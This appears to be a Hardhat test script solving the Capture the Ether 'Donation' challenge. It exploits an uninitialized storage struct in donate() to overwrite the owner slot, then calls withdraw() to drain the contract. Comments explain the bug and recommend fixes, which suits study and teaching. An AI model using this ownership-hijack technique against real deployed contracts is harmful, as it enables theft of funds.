import { ethers } from "hardhat";
import { expect } from "chai";
import { BigNumber } from "ethers";

describe("DonationChallenge", function () {
  it("should exploit storage misalignment and overwrite owner address", async function () {
    const [attacker] = await ethers.getSigners();

    // Step 1: Deploy the vulnerable contract with 1 ether
    const ChallengeFactory = await ethers.getContractFactory("DonationChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy({
      value: ethers.utils.parseEther("1.0"),
    });
    await challenge.deployed();
    console.log("Contract deployed at:", challenge.address);

    // Step 2: Get attacker's address in uint256 form
    const attackerAddress = BigNumber.from(await attacker.getAddress());
    console.log("Attacker address as uint256:", attackerAddress.toString());

    // Step 3: Calculate msg.value such that msg.value == etherAmount / (10**36)
    // 1 ether := 10**18 => scale is 10**18 * 10**18 = 10**36
    // This is possible because of the broken scaling in the donate() function
    const scale = BigNumber.from("10").pow(36);
    const requiredValue = attackerAddress.div(scale);
    console.log("Value to send (in wei):", requiredValue.toString());

    // Step 4: Exploit donate() by setting etherAmount = attackerAddress
    // This writes to storage slot 0 and 1 (overwriting isComplete and owner)
    const tx = await challenge.connect(attacker).donate(attackerAddress.toString(), {
      value: requiredValue,
    });
    await tx.wait();
    console.log("Exploit transaction mined: struct write hijacked owner slot");

    // Step 5: Call withdraw() — now that we are the new owner
    const withdrawTx = await challenge.connect(attacker).withdraw();
    await withdrawTx.wait();
    console.log("Withdraw executed as overwritten owner");

    // Step 6: Validate challenge is complete
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved: contract balance is 0");

     // --- Remediation Note ---
    // This vulnerability arises due to:
    // 1. An uninitialized struct `Donation donation;` that defaults to storage,
    //    which causes `donation.timestamp` and `donation.etherAmount` to write to
    //    storage slot 0 and 1 respectively — overwriting `isComplete` and `owner`.
    //
    // 2. A broken etherAmount check using `scale = 10^36`, leading to a much
    //    smaller required msg.value than expected, enabling practical exploitation.
    //
    // Recommended fixes:
    // - Always declare struct variables with an explicit data location (e.g., `memory`).
    // - Ensure unit-consistent calculations (i.e., both `etherAmount` and `msg.value` in wei).
    // - Avoid writing to struct fields before full initialization to prevent slot collisions.
  

  });
});
